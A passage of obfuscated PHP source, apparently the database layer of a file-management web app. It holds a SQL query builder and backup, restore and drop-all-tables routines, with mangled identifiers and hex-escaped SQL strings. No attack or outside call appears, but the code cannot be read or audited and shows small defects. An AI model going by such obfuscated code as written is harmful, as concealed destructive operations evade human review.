!empty($Ó·Çê‹) ? $—‘ëú°Ü[51] . $Ó·Çê‹ . $—‘ëú°Ü[53] : $—‘ëú°Ü[12]; } protected function parseJoin($ùÜõ¿Öù) { $“Ûâ¹Æ‹ =& $_SERVER[®»±”ó²]; $‚´±Û½ = $“Ûâ¹Æ‹[12]; if (!empty($ùÜõ¿Öù)) { if (is_array($ùÜõ¿Öù)) { foreach ($ùÜõ¿Öù as $Ò£Õ‘ä => $øÈáÒã) { if (!1 !== stripos($øÈáÒã, $“Ûâ¹Æ‹[1111])) { $‚´±Û½ .= $“Ûâ¹Æ‹[53] . $øÈáÒã; } else { $‚´±Û½ .= $“Ûâ¹Æ‹[1112] . $øÈáÒã; } } } else { $‚´±Û½ .= $“Ûâ¹Æ‹[1112] . $ùÜõ¿Öù; } } $‚´±Û½ = preg_replace($“Ûâ¹Æ‹[1113], think_config($“Ûâ¹Æ‹[1017]) . $“Ûâ¹Æ‹[1114], $‚´±Û½); return $‚´±Û½; } protected function parseOrder($æ„“æ°Å) { $òÈíÓ÷© =& $_SERVER[®»±”ó²]; if (is_array($æ„“æ°Å)) { $Ëñö¯ÀÒ = array(); foreach ($æ„“æ°Å as $õâÕıƒñ => $æ«¯¸Ø) { if (is_numeric($õâÕıƒñ)) { $Ëñö¯ÀÒ[] = $this->parseKey($æ«¯¸Ø); } else { $æ«¯¸Ø = in_array(strtoupper(trim($æ«¯¸Ø)), array($òÈíÓ÷©[1115], $òÈíÓ÷©[1116])) ? $òÈíÓ÷©[53] . $æ«¯¸Ø : $òÈíÓ÷©[12]; if (preg_match($òÈíÓ÷©[1117], $õâÕıƒñ)) { $Ëñö¯ÀÒ[] = $this->parseKey($õâÕıƒñ) . $æ«¯¸Ø; } else { think_exception($òÈíÓ÷©[1118] . $õâÕıƒñ); } } } $æ„“æ°Å = implode($òÈíÓ÷©[50], $Ëñö¯ÀÒ); } return !empty($æ„“æ°Å) ? $òÈíÓ÷©[1119] . $æ„“æ°Å : $òÈíÓ÷©[12]; } protected function parseGroup($¹¹ñÕ·Ã) { $˜ĞÑÉëª =& $_SERVER[®»±”ó²]; return !empty($¹¹ñÕ·Ã) ? $˜ĞÑÉëª[1120] . $¹¹ñÕ·Ã : $˜ĞÑÉëª[12]; } protected function parseHaving($’œ…®õ­) { $Ì³ôÆ…Î =& $_SERVER[®»±”ó²]; return !empty($’œ…®õ­) ? $Ì³ôÆ…Î[1121] . $’œ…®õ­ : $Ì³ôÆ…Î[12]; } protected function parseComment($»å“ÌÎ) { $ØäÔ©¨ =& $_SERVER[®»±”ó²]; return !empty($»å“ÌÎ) ? $ØäÔ©¨[1122] . $»å“ÌÎ . $ØäÔ©¨[1123] : $ØäÔ©¨[12]; } protected function parseDistinct($¾­‹İŒÇ) { $Ïœù´œ° =& $_SERVER[®»±”ó²]; return !empty($¾­‹İŒÇ) ? $Ïœù´œ°[1124] : $Ïœù´œ°[12]; } protected function parseUnion($Á‹‘ßÊÃ) { $„Œ‹‘‘¼ =& $_SERVER[®»±”ó²]; if (empty($Á‹‘ßÊÃ)) { return $„Œ‹‘‘¼[12]; } if (isset($Á‹‘ßÊÃ[$„Œ‹‘‘¼[425]])) { $ÛßÜç•â = $„Œ‹‘‘¼[1125]; unset($Á‹‘ßÊÃ[$„Œ‹‘‘¼[425]]); } else { $ÛßÜç•â = $„Œ‹‘‘¼[1126]; } foreach ($Á‹‘ßÊÃ as $Ø×¡—›à) { $­¹Æêø÷[] = $ÛßÜç•â . (is_array($Ø×¡—›à) ? $this->buildSelectSql($Ø×¡—›à) : $Ø×¡—›à); } return implode($„Œ‹‘‘¼[53], $­¹Æêø÷); } public function insert($Ì¹í¢éö, $ßÚ¬ì¼ = array(), $ÙÜ™ú•Ç = false) { $ ô‚Œ÷¨ =& $_SERVER[®»±”ó²]; $Ğ×Û¨¶Ó = $âğ¨ûˆ½ = array(); $this->model = $ßÚ¬ì¼[$ ô‚Œ÷¨[361]]; foreach ($Ì¹í¢éö as $ÎõË¸‘½ => $áûİ†•Ø) { if (is_array($áûİ†•Ø) && $ ô‚Œ÷¨[374] == $áûİ†•Ø[0]) { $âğ¨ûˆ½[] = $this->parseKey($ÎõË¸‘½); $Ğ×Û¨¶Ó[] = $áûİ†•Ø[1]; } elseif (is_scalar($áûİ†•Ø) || is_null($áûİ†•Ø)) { $âğ¨ûˆ½[] = $this->parseKey($ÎõË¸‘½); $Ğ×Û¨¶Ó[] = $this->parseValue($áûİ†•Ø); } } $š÷–’š = ($ÙÜ™ú•Ç ? $ ô‚Œ÷¨[994] : $ ô‚Œ÷¨[995]) . $ ô‚Œ÷¨[996] . $this->parseTable($ßÚ¬ì¼[$ ô‚Œ÷¨[359]]) . $ ô‚Œ÷¨[990] . implode($ ô‚Œ÷¨[50], $âğ¨ûˆ½) . $ ô‚Œ÷¨[991] . implode($ ô‚Œ÷¨[50], $Ğ×Û¨¶Ó) . $ ô‚Œ÷¨[992]; $š÷–’š .= $this->parseLock(isset($ßÚ¬ì¼[$ ô‚Œ÷¨[930]]) ? $ßÚ¬ì¼[$ ô‚Œ÷¨[930]] : !1); $š÷–’š .= $this->parseComment(!empty($ßÚ¬ì¼[$ ô‚Œ÷¨[431]]) ? $ßÚ¬ì¼[$ ô‚Œ÷¨[431]] : $ ô‚Œ÷¨[12]); return $this->execute($š÷–’š, $this->parseBind(!empty($ßÚ¬ì¼[$ ô‚Œ÷¨[363]]) ? $ßÚ¬ì¼[$ ô‚Œ÷¨[363]] : array())); } public function selectInsert($Ù”õ£¹ , $ì½Û§Œõ, $ŸæœÉ©ç = array()) { $Š÷”»ÄÏ =& $_SERVER[®»±”ó²]; $this->model = $ŸæœÉ©ç[$Š÷”»ÄÏ[361]]; if (is_string($Ù”õ£¹ )) { $Ù”õ£¹  = explode($Š÷”»ÄÏ[50], $Ù”õ£¹ ); } array_walk($Ù”õ£¹ , array($this, $Š÷”»ÄÏ[993])); $êîæ¾©û = $Š÷”»ÄÏ[1127] . $this->parseTable($ì½Û§Œõ) . $Š÷”»ÄÏ[990] . implode($Š÷”»ÄÏ[50], $Ù”õ£¹ ) . $Š÷”»ÄÏ[1105]; $êîæ¾©û .= $this->buildSelectSql($ŸæœÉ©ç); return $this->execute($êîæ¾©û, $this->parseBind(!empty($ŸæœÉ©ç[$Š÷”»ÄÏ[363]]) ? $ŸæœÉ©ç[$Š÷”»ÄÏ[363]] : array())); } public function update($¢ò¾Ú‘Î, $Õ×´°Ö) { $¯ç˜ŒÌ¿ =& $_SERVER[®»±”ó²]; $this->model = $Õ×´°Ö[$¯ç˜ŒÌ¿[361]]; $ôö›£Óí = $¯ç˜ŒÌ¿[1128] . $this->parseTable($Õ×´°Ö[$¯ç˜ŒÌ¿[359]]) . $this->parseSet($¢ò¾Ú‘Î) . $this->parseWhere(!empty($Õ×´°Ö[$¯ç˜ŒÌ¿[355]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[355]] : $¯ç˜ŒÌ¿[12]) . $this->parseOrder(!empty($Õ×´°Ö[$¯ç˜ŒÌ¿[443]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[443]] : $¯ç˜ŒÌ¿[12]) . $this->parseLimit(!empty($Õ×´°Ö[$¯ç˜ŒÌ¿[370]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[370]] : $¯ç˜ŒÌ¿[12]) . $this->parseLock(isset($Õ×´°Ö[$¯ç˜ŒÌ¿[930]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[930]] : !1) . $this->parseComment(!empty($Õ×´°Ö[$¯ç˜ŒÌ¿[431]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[431]] : $¯ç˜ŒÌ¿[12]); return $this->execute($ôö›£Óí, $this->parseBind(!empty($Õ×´°Ö[$¯ç˜ŒÌ¿[363]]) ? $Õ×´°Ö[$¯ç˜ŒÌ¿[363]] : array())); } public function delete($§Ø£®äœ = array()) { $…›¸Û‚ =& $_SERVER[®»±”ó²]; $this->model = $§Ø£®äœ[$…›¸Û‚[361]]; $Ö“Ö¥øı = $…›¸Û‚[1129] . $this->parseTable($§Ø£®äœ[$…›¸Û‚[359]]) . $this->parseWhere(!empty($§Ø£®äœ[$…›¸Û‚[355]]) ? $§Ø£®äœ[$…›¸Û‚[355]] : $…›¸Û‚[12]) . $this->parseOrder(!empty($§Ø£®äœ[$…›¸Û‚[443]]) ? $§Ø£®äœ[$…›¸Û‚[443]] : $…›¸Û‚[12]) . $this->parseLimit(!empty($§Ø£®äœ[$…›¸Û‚[370]]) ? $§Ø£®äœ[$…›¸Û‚[370]] : $…›¸Û‚[12]) . $this->parseLock(isset($§Ø£®äœ[$…›¸Û‚[930]]) ? $§Ø£®äœ[$…›¸Û‚[930]] : !1) . $this->parseComment(!empty($§Ø£®äœ[$…›¸Û‚[431]]) ? $§Ø£®äœ[$…›¸Û‚[431]] : $…›¸Û‚[12]); return $this->execute($Ö“Ö¥øı, $this->parseBind(!empty($§Ø£®äœ[$…›¸Û‚[363]]) ? $§Ø£®äœ[$…›¸Û‚[363]] : array())); } public function select($ô•şî©Ü = array()) { $­Ê×ñÛÎ =& $_SERVER[®»±”ó²]; $this->model = $ô•şî©Ü[$­Ê×ñÛÎ[361]]; $ĞºÔ «ƒ = $this->buildSelectSql($ô•şî©Ü); $Ğ«¾ö ò = isset($ô•şî©Ü[$­Ê×ñÛÎ[426]]) ? $ô•şî©Ü[$­Ê×ñÛÎ[426]] : !1; if ($Ğ«¾ö ò) { $«Áì´ıÚ = is_string($Ğ«¾ö ò[$­Ê×ñÛÎ[97]]) ? $Ğ«¾ö ò[$­Ê×ñÛÎ[97]] : $­Ê×ñÛÎ[1130] . md5($ĞºÔ «ƒ); $ëæ½¹‡æ = think_cache($«Áì´ıÚ, $­Ê×ñÛÎ[12], $Ğ«¾ö ò); if (!1 !== $ëæ½¹‡æ) { return $ëæ½¹‡æ; } } $¿®©¢Â¡ = $this->query($ĞºÔ «ƒ, $this->parseBind(!empty($ô•şî©Ü[$­Ê×ñÛÎ[363]]) ? $ô•şî©Ü[$­Ê×ñÛÎ[363]] : array())); if ($Ğ«¾ö ò && !1 !== $¿®©¢Â¡) { think_cache($«Áì´ıÚ, $¿®©¢Â¡, $Ğ«¾ö ò); } return $¿®©¢Â¡; } public function buildSelectSql($è•È¥”Œ = array()) { $‹†İ«Ì =& $_SERVER[®»±”ó²]; if (isset($è•È¥”Œ[$‹†İ«Ì[430]])) { if (strpos($è•È¥”Œ[$‹†İ«Ì[430]], $‹†İ«Ì[50])) { list($ŞüÌÀ¨¶, $Â”ùÜ¹”) = explode($‹†İ«Ì[50], $è•È¥”Œ[$‹†İ«Ì[430]]); } else { $ŞüÌÀ¨¶ = $è•È¥”Œ[$‹†İ«Ì[430]]; } $ŞüÌÀ¨¶ = $ŞüÌÀ¨¶ ? $ŞüÌÀ¨¶ : 1; $Â”ùÜ¹” = isset($Â”ùÜ¹”) ? $Â”ùÜ¹” : (is_numeric($è•È¥”Œ[$‹†İ«Ì[370]]) ? $è•È¥”Œ[$‹†İ«Ì[370]] : 20); $ö‡íÀ = $Â”ùÜ¹” * ((int) $ŞüÌÀ¨¶ - 1); $è•È¥”Œ[$‹†İ«Ì[370]] = $ö‡íÀ . $‹†İ«Ì[50] . $Â”ùÜ¹”; } if (think_config($‹†İ«Ì[1131])) { $´º›æûâ = $‹†İ«Ì[1132] . md5(serialize($è•È¥”Œ)); $æâã¤Ş = think_cache($´º›æûâ); if ($æâã¤Ş) { return $æâã¤Ş; } } $©¡ÃÏ—¾ = $this->parseSql($this->selectSql, $è•È¥”Œ); $©¡ÃÏ—¾ .= $this->parseLock(isset($è•È¥”Œ[$‹†İ«Ì[930]]) ? $è•È¥”Œ[$‹†İ«Ì[930]] : !1); if (isset($´º›æûâ)) { think_cache($´º›æûâ, $©¡ÃÏ—¾); } return $©¡ÃÏ—¾; } public function parseSql($ ¸ë»Èı, $öÓ¤£úî = array()) { $’àªÇ½ù =& $_SERVER[®»±”ó²]; $ ¸ë»Èı = str_replace(array($’àªÇ½ù[1133], $’àªÇ½ù[1134], $’àªÇ½ù[1135], $’àªÇ½ù[1136], $’àªÇ½ù[1137], $’àªÇ½ù[1138], $’àªÇ½ù[1139], $’àªÇ½ù[1140], $’àªÇ½ù[1141], $’àªÇ½ù[1142], $’àªÇ½ù[1143]), array($this->parseTable("{$öÓ¤£úî[$’àªÇ½ù[359]]}"), $this->parseDistinct(isset($öÓ¤£úî[$’àªÇ½ù[1144]]) ? $öÓ¤£úî[$’àªÇ½ù[1144]] : !1), $this->parseField(!empty($öÓ¤£úî[$’àªÇ½ù[353]]) ? $öÓ¤£úî[$’àªÇ½ù[353]] : $’àªÇ½ù[223]), $this->parseJoin(!empty($öÓ¤£úî[$’àªÇ½ù[362]]) ? $öÓ¤£úî[$’àªÇ½ù[362]] : $’àªÇ½ù[12]), $this->parseWhere(!empty($öÓ¤£úî[$’àªÇ½ù[355]]) ? $öÓ¤£úî[$’àªÇ½ù[355]] : $’àªÇ½ù[12]), $this->parseGroup(!empty($öÓ¤£úî[$’àªÇ½ù[591]]) ? $öÓ¤£úî[$’àªÇ½ù[591]] : $’àªÇ½ù[12]), $this->parseHaving(!empty($öÓ¤£úî[$’àªÇ½ù[1145]]) ? $öÓ¤£úî[$’àªÇ½ù[1145]] : $’àªÇ½ù[12]), $this->parseOrder(!empty($öÓ¤£úî[$’àªÇ½ù[443]]) ? $öÓ¤£úî[$’àªÇ½ù[443]] : $’àªÇ½ù[12]), $this->parseLimit(!empty($öÓ¤£úî[$’àªÇ½ù[370]]) ? $öÓ¤£úî[$’àªÇ½ù[370]] : $’àªÇ½ù[12]), $this->parseUnion(!empty($öÓ¤£úî[$’àªÇ½ù[424]]) ? $öÓ¤£úî[$’àªÇ½ù[424]] : $’àªÇ½ù[12]), $this->parseComment(!empty($öÓ¤£úî[$’àªÇ½ù[431]]) ? $öÓ¤£úî[$’àªÇ½ù[431]] : $’àªÇ½ù[12])), $ ¸ë»Èı); return $ ¸ë»Èı; } public function getLastSql($©Ë©ë› = '') { return $©Ë©ë› ? $this->modelSql[$©Ë©ë›] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($«¡Òì£û) { return addslashes($«¡Òì£û); } public function setModel($¸œğÎ’ê) { $this->model = $¸œğÎ’ê; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($İ½ÎŸÂ = array()) { $èäìÑ‘ =& $_SERVER[®»±”ó²]; if (empty($İ½ÎŸÂ)) { $İ½ÎŸÂ = $GLOBALS[$èäìÑ‘[6]][$èäìÑ‘[21]]; } $this->database = $İ½ÎŸÂ; } public function model($¯Í“ìŠ = '') { return new ModelBase($¯Í“ìŠ, $_SERVER[®»±”ó²][12], $this->database); } public function db($“‘àåÚ· = false) { $»ÎêÖîÄ =& $_SERVER[®»±”ó²]; $²ş”…›¸ = array_change_key_case($this->database); if ($this->dbType() == $»ÎêÖîÄ[13] || !$“‘àåÚ·) { return $this->model()->db(); } $¿öµ‡êó = $²ş”…›¸[$»ÎêÖîÄ[1059]]; $²ş”…›¸[$»ÎêÖîÄ[1059]] = $»ÎêÖîÄ[12]; if ($²ş”…›¸[$»ÎêÖîÄ[1054]] == $»ÎêÖîÄ[1051]) { $¼‡Æ•éÑ = $²ş”…›¸[$»ÎêÖîÄ[1060]]; $²ş”…›¸[$»ÎêÖîÄ[1060]] = substr($¼‡Æ•éÑ, 0, strrpos($¼‡Æ•éÑ, $»ÎêÖîÄ[1146])); } $this->database = $²ş”…›¸; $¼¾¾Ö© = $this->model()->db(); try { $ö¤İ³¸À = $¼¾¾Ö©->execute("\x73\150\157\x77\x20\x64\x61\x74\141\142\x61\163\x65\163\40\x6c\x69\x6b\145\x20\x27{$¿öµ‡êó}\x27"); } catch (Exception $Ü¶ŠĞ½ä) { } if (!$ö¤İ³¸À) { $¼¾¾Ö©->execute("\x63\162\x65\x61\x74\145\x20\x64\141\164\141\142\141\x73\145\40\140{$¿öµ‡êó}\140"); } $²ş”…›¸[$»ÎêÖîÄ[1059]] = $¿öµ‡êó; if ($²ş”…›¸[$»ÎêÖîÄ[1054]] == $»ÎêÖîÄ[1051]) { $²ş”…›¸[$»ÎêÖîÄ[1060]] .= $»ÎêÖîÄ[1146] . $¿öµ‡êó; } $this->database = $²ş”…›¸; $¼¾¾Ö©->execute("\x75\x73\145\40\x60{$¿öµ‡êó}\140"); return $¼¾¾Ö©; } public function createTable($è²ô€›, &$ş”ÈÉù¡) { $…£ç¬¼ı =& $_SERVER[®»±”ó²]; if (!IO::exist($è²ô€›)) { ActionCall($…£ç¬¼ı[1147], !0, 0); show_json(LNG($…£ç¬¼ı[1148]), !1); } $¸ÃĞôÚ‰ = $this->model()->db(); $ı¹§¬ÃÁ = sqlSplit(IO::getContent($è²ô€›)); foreach ($ı¹§¬ÃÁ as $÷§Ğ¢û¾) { $ŒŠ¦à¬ = stripos($÷§Ğ¢û¾, $…£ç¬¼ı[1149]) === 0; if ($ŒŠ¦à¬) { $ş”ÈÉù¡->task[$…£ç¬¼ı[1150]] += 1; } $¸ÃĞôÚ‰->execute($÷§Ğ¢û¾); if ($ŒŠ¦à¬) { preg_match($…£ç¬¼ı[1151], $÷§Ğ¢û¾, $ÔŸÌ×è); $ş”ÈÉù¡->task[$…£ç¬¼ı[1152]] = $ÔŸÌ×è[1]; $ş”ÈÉù¡->update(1); } } } public function insertTable($À‹½‰Ú, &$‰åÓºÆ) { $¯ãŞš²Â =& $_SERVER[®»±”ó²]; $ã‡ ¶ÊÌ = $this->model()->db(); $‰ê¾…™¾ = $±Ñ•ºåÂ ? array($±Ñ•ºåÂ) : $ã‡ ¶ÊÌ->getTables(); foreach ($À‹½‰Ú as $‚¶¨É“£) { $±Ñ•ºåÂ = basename($‚¶¨É“£, $¯ãŞš²Â[871]); if (!in_array($±Ñ•ºåÂ, $‰ê¾…™¾)) { continue; } $‰åÓºÆ->task[$¯ãŞš²Â[1152]] = $±Ñ•ºåÂ; if (get_filesize($‚¶¨É“£) == 0) { continue; } $ ï‘Ï¬¿ = $this->sqlToDb($‚¶¨É“£, $‰åÓºÆ); if (!$ ï‘Ï¬¿) { ActionCall($¯ãŞš²Â[1147], !0, 0); show_json(LNG($¯ãŞš²Â[1153]) . "\133{$±Ñ•ºåÂ}\135", !1); } } } public function sqlFromDb($ÀÙğÎ£Î, $ò¸éş¿ù, &$èÓ´Ã, $“Äû¯Ø’ = '') { if ($èÓ´Ã) { $èÓ´Ã->task[$_SERVER[®»±”ó²][1152]] = $ÀÙğÎ£Î; } $Ñ¦şÆÔ = $this->model($ÀÙğÎ£Î); $³è‚¶«÷ = 0; $€Ú’´­ = 0; $…ã…˜ÜÚ = 10000; $ÌÀè½‡À = fopen($ò¸éş¿ù, $_SERVER[®»±”ó²][1154]); $Óé”•—€ = $Ñ¦şÆÔ->getPk(); $¾¼¡óæÑ = $Ñ¦şÆÔ->getDbFields(); $²ŒğÈÆ× = $_SERVER[®»±”ó²][12]; if ($GLOBALS[$_SERVER[®»±”ó²][870]] && in_array($ÀÙğÎ£Î, array($_SERVER[®»±”ó²][1155], $_SERVER[®»±”ó²][1156]))) { $²ŒğÈÆ× = $ÀÙğÎ£Î; } do { $ïŠ«½‚§ = array($Óé”•—€ => array($_SERVER[®»±”ó²][1101], $€Ú’´­)); $‘€Ù±¡æ = $Ñ¦şÆÔ->where($ïŠ«½‚§)->field($¾¼¡óæÑ)->order($Óé”•—€ . $_SERVER[®»±”ó²][1157])->limit($…ã…˜ÜÚ)->select(); $‘€Ù±¡æ = !empty($‘€Ù±¡æ) ? $‘€Ù±¡æ : array(); if (!($ŠÒÙ»à¹ = count($‘€Ù±¡æ))) { break; } $èõ€¼ó = end($‘€Ù±¡æ); $€Ú’´­ = $èõ€¼ó[$Óé”•—€]; $©ê×Ôèì = array(); foreach ($‘€Ù±¡æ as $¥‡……¯ß) { if ($²ŒğÈÆ×) { if ($ÀÙğÎ£Î == $_SERVER[®»±”ó²][1155]) { if ($¥‡……¯ß[$_SERVER[®»±”ó²][33]] == $_SERVER[®»±”ó²][1158]) { $ˆ¸›²ç = json_decode($¥‡……¯ß[$_SERVER[®»±”ó²][452]], !0); if ($ˆ¸›²ç[$_SERVER[®»±”ó²][32]] == $GLOBALS[$_SERVER[®»±”ó²][870]] && $ˆ¸›²ç[$_SERVER[®»±”ó²][830]] != 1) { continue; } } } else { if ($¥‡……¯ß[$_SERVER[®»±”ó²][33]] == $_SERVER[®»±”ó²][1159] && $¥‡……¯ß[$_SERVER[®»±”ó²][97]] == $_SERVER[®»±”ó²][866]) { continue; } } } if ($“Äû¯Ø’) { $¥‡……¯ß[$_SERVER[®»±”ó²][87]] = "\x7b\x69\x6f\72{$“Äû¯Ø’}\175" . substr($¥‡……¯ß[$_SERVER[®»±”ó²][87]], strlen("\x7b\151\157\72{$¥‡……¯ß[$_SERVER[®»±”ó²][904]]}\175")); $¥‡……¯ß[$_SERVER[®»±”ó²][904]] = $“Äû¯Ø’; } $©ê×Ôèì[] = $_SERVER[®»±”ó²][1160] . $this->sqlEncode($¥‡……¯ß) . $_SERVER[®»±”ó²][1161]; } $Ê÷Áö½Æ = "\x49\116\123\105\x52\124\x20\x49\116\124\x4f\40\x60{$ÀÙğÎ£Î}\140\40\50\x60" . implode($_SERVER[®»±”ó²][1162], $¾¼¡óæÑ) . $_SERVER[®»±”ó²][1163]; fwrite($ÌÀè½‡À, $Ê÷Áö½Æ . implode($_SERVER[®»±”ó²][1164], $©ê×Ôèì) . $_SERVER[®»±”ó²][74] . PHP_EOL); $³è‚¶«÷ += $ŠÒÙ»à¹; if ($èÓ´Ã) { $èÓ´Ã->update($ŠÒÙ»à¹); } } while ($…ã…˜ÜÚ == $ŠÒÙ»à¹); fclose($ÌÀè½‡À); return $³è‚¶«÷; } public function sqlToDb($¥Ì«€¥¸, &$÷š†Í©ä) { $¨“şÎê¥ =& $_SERVER[®»±”ó²]; $µ¹•³Ú¢ = $this->model()->db(); $’ĞÄ·ÜÈ = @fopen($¥Ì«€¥¸, $¨“şÎê¥[1165]); if (!$’ĞÄ·ÜÈ) { return !1; } $÷¿®¤ˆà = 0; $ë¢Âì  = $¨“şÎê¥[12]; $Ï„ÉøÔ = array(); $ã†ı¾¹´ = $this->dbType(); $Ã´Ÿå¶ = $ã†ı¾¹´ == $¨“şÎê¥[13] ? 500 : 2000; $áá©Ë«æ = basename($¥Ì«€¥¸, $¨“şÎê¥[871]); $Ûâ­Ûåç = 0; $ª‚€ùÜ• = 4194304; while (!feof($’ĞÄ·ÜÈ)) { $ôºëöãÌ = trim(fgets($’ĞÄ·ÜÈ)); if (!$ôºëöãÌ) { continue; } $ş¯üÌ¢‘ = $this->sqlDecode($ôºëöãÌ, $ã†ı¾¹´, $áá©Ë«æ); if (stripos($ş¯üÌ¢‘, $¨“şÎê¥[432]) === 0) { if (!$ë¢Âì ) { $ë¢Âì  = $ş¯üÌ¢‘ . $¨“şÎê¥[53]; } continue; } if ($÷š†Í©ä) { $÷š†Í©ä->task[$¨“şÎê¥[1150]] += 1; } $÷¿®¤ˆà++; $Ï„ÉøÔ[] = rtrim(rtrim(trim($ş¯üÌ¢‘), $¨“şÎê¥[50]), $¨“şÎê¥[74]); $„©úè”· = null; $ÇÃÚ–ø› = strlen($ş¯üÌ¢‘); $Ûâ­Ûåç += $ÇÃÚ–ø›; $Û¢ĞÍ¿» = strlen($ë¢Âì ) + $Ûâ­Ûåç + (count($Ï„ÉøÔ) - 1); if ($Û¢ĞÍ¿» >= $ª‚€ùÜ•) { $„©úè”· = array_pop($Ï„ÉøÔ); if ($÷¿®¤ˆà > 1) { $÷¿®¤ˆà--; } } if ($÷¿®¤ˆà >= $Ã´Ÿå¶ || $„©úè”·) { $ş¯üÌ¢‘ = $ë¢Âì  . implode($¨“şÎê¥[50], $Ï„ÉøÔ); if (!$µ¹•³Ú¢->execute($ş¯üÌ¢‘)) { return !1; } if ($÷š†Í©ä) { $÷š†Í©ä->update($÷¿®¤ˆà); } $Ï„ÉøÔ = array(); $÷¿®¤ˆà = 0; $Ûâ­Ûåç = 0; if ($„©úè”·) { $Ï„ÉøÔ = array($„©úè”·); $÷¿®¤ˆà = 1; $Ûâ­Ûåç = $ÇÃÚ–ø›; } } } fclose($’ĞÄ·ÜÈ); if (!empty($Ï„ÉøÔ)) { $ş¯üÌ¢‘ = $ë¢Âì  . implode($¨“şÎê¥[50], $Ï„ÉøÔ); if (!$µ¹•³Ú¢->execute($ş¯üÌ¢‘)) { return !1; } if ($÷š†Í©ä) { $÷š†Í©ä->update($÷¿®¤ˆà); } } return !0; } public function dropTable($«²íÃƒ = null) { $„ËóÊü¡ = $this->model()->db(); $ãøİÎÓ¶ = $«²íÃƒ ? array($«²íÃƒ) : $„ËóÊü¡->getTables(); if (!$ãøİÎÓ¶) { return; } foreach ($ãøİÎÓ¶ as $«²íÃƒ) { if ($«²íÃƒ) { $«²íÃƒ = strtolower($«²íÃƒ); } else { continue; } $„ËóÊü¡->execute("\144\x72\157\160\40\164\141\x62\x6c\145\40\151\146\x20\145\170\151\x73\164\163\x20\x60{$«²íÃƒ}\x60"); } } private function sqlEncode($”ß«ò¥İ) { $ÖÆ‚ã÷Ã =& $_SERVER[®»±”ó²]; $ä…àªÛ = array(); foreach ($”ß«ò¥İ as $ƒ¾ÏœóÑ) { if (is_array($ƒ¾ÏœóÑ)) { $ƒ¾ÏœóÑ = json_encode_force($ƒ¾ÏœóÑ); } $ƒ¾ÏœóÑ = addslashes($ƒ¾ÏœóÑ); $ƒ¾ÏœóÑ = str_replace(array($ÖÆ‚ã÷Ã[1166], $ÖÆ‚ã÷Ã[288], $ÖÆ‚ã÷Ã[419]), array($ÖÆ‚ã÷Ã[1167], $ÖÆ‚ã÷Ã[1168], $ÖÆ‚ã÷Ã[1169]), $ƒ¾ÏœóÑ); $ä…àªÛ[] = $ƒ¾ÏœóÑ; } return $ÖÆ‚ã÷Ã[58] . implode($ÖÆ‚ã÷Ã[1170], $ä…àªÛ) . $ÖÆ‚ã÷Ã[58]; } private function sqlDecode($Âó¶¥Ùá, $¼ùÉ»»¹, $œúÂ¥Ë® = '') { $Ñü…×ÆÍ =& $_SERVER[®»±”ó²]; $Âó¶¥Ùá = str_replace(array($Ñü…×ÆÍ[1167], $Ñü…×ÆÍ[1168], $Ñü…×ÆÍ[1169]), array($Ñü…×ÆÍ[1166], $Ñü…×ÆÍ[288], $Ñü…×ÆÍ[419]), $Âó¶¥Ùá); if ($¼ùÉ»»¹ == $Ñü…×ÆÍ[13]) { $Âó¶¥Ùá = str_ireplace($Ñü…×ÆÍ[1171], $Ñü…×ÆÍ[59], $Âó¶¥Ùá); $Âó¶¥Ùá = stripslashes($Âó¶¥Ùá); } return preg_replace($Ñü…×ÆÍ[1172], $Ñü…×ÆÍ[12], $Âó¶¥Ùá); if ($¼ùÉ»»¹ == $Ñü…×ÆÍ[13]) { return $œúÂ¥Ë® != $Ñü…×ÆÍ[865] ? stripslashes($Âó¶¥Ùá) : $Âó¶¥Ùá; } if ($œúÂ¥Ë® == $Ñü…×ÆÍ[865]) { $Âó¶¥Ùá = str_replace($Ñü…×ÆÍ[1173], $Ñü…×ÆÍ[121], stripslashes($Âó¶¥Ùá)); } return $Âó¶¥Ùá; } public function getSqlFile($Øõõ½… = '') { $èÇßÖñë =& $_SERVER[®»±”ó²]; $¨Ã¢…ïÕ = $this->dbType(!0); $³û¢£ = CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\154\57\x64\x61\x74\x61\57{$¨Ã¢…ïÕ}\x2e\163\161\x6c"; $á‹Âö´¼ = file_get_contents($³û¢£); $©‚á›äÜ = $èÇßÖñë[1174] . ($¨Ã¢…ïÕ == $èÇßÖñë[889] ? $èÇßÖñë[1175] : $èÇßÖñë[1176]) . $èÇßÖñë[1177]; preg_match_all($©‚á›äÜ, $á‹Âö´¼, $‹í¡·Ó™); $‘¾¦İÆÜ = $‹í¡·Ó™[1]; $¼û¿ = $this->model()->db(); $Ãæï¿¦¾ = $¼û¿->getTables(); $ÓÒ´§Â = TEMP_FILES . $èÇßÖñë[1178] . date($èÇßÖñë[262]) . $èÇßÖñë[8]; del_dir($ÓÒ´§Â); mk_dir($ÓÒ´§Â); $ëå‘´‡Ç = $ÓÒ´§Â . $èÇßÖñë[1179]; $úÄ›¿Á¤ = $ÓÒ´§Â . $èÇßÖñë[1180]; $•âêÀ¢Ç = $¨Ã¢…ïÕ == $èÇßÖñë[13] ? $èÇßÖñë[889] : $èÇßÖñë[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\141\154\154\x2f\x64\141\164\x61\x2f{$•âêÀ¢Ç}\x2e\x73\x71\x6c", $ÓÒ´§Â); @touch($ÓÒ´§Â . $¨Ã¢…ïÕ . $èÇßÖñë[871]); $‰À—¡ğœ = fopen($ëå‘´‡Ç, $èÇßÖñë[1154]); $Î†ï…ÂĞ = fopen($úÄ›¿Á¤, $èÇßÖñë[1154]); if ($¨Ã¢…ïÕ == $èÇßÖñë[13]) { $Ãæï¿¦¾ = array_diff($Ãæï¿¦¾, array($èÇßÖñë[863], $èÇßÖñë[864])); $ÎÖ°¥‡ = array($èÇßÖñë[1181], $èÇßÖñë[1182], $èÇßÖñë[1183]); fwrite($Î†ï…ÂĞ, implode(PHP_EOL, $ÎÖ°¥‡) . PHP_EOL . PHP_EOL); foreach ($Ãæï¿¦¾ as $éÛî€) { $‰á´°­à = $this->sqlFromSqlite($éÛî€); if (!$‰á´°­à[$èÇßÖñë[13]]) { continue; } 